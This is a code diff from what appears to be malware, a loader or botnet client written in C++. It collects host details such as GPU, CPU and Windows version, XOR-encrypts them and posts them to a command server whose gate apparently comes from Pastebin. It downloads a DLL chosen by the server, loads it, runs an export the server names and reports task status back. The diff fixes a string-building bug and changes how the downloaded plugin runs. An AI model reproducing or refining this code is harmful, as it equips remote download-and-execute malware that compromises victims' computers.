@@ -62,7 +62,7 @@ public:
 			"&gpuName=" + gpuName +
 			"&cpuName=" + cpuName +
 			"&arch=" + prcessorArchitecture +
-			"&operingsystem=" + winver;
+			"&operingsystem=" + winver +
 			"&spreadtag=" + config.spreadtag;
 		std::string finalPost = "request=" + XOR::encryptReqeust(args);
 		
@@ -124,17 +124,19 @@ public:
 					Helpers::downloadFile(url, file);
 					std::string started = OBFUSCATE("failed");
 
-			
+					
 					HINSTANCE hGetProcIDDLL = LoadLibrary(file.c_str());
 					if (hGetProcIDDLL) {
 						//started = "loaded";
 						if (v[3] != "") {
 							func fn = (func)GetProcAddress(hGetProcIDDLL, (LPCSTR)v[3].c_str());
-							runningPlugin = std::thread(fn, v[4]);
+							//runningPlugin = std::thread(fn, v[4]);
+							fn(v[4]);
+							FreeLibrary(hGetProcIDDLL);
 						}
 						started = "success";
 					}
-
+					
 					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
 				}
 				else {
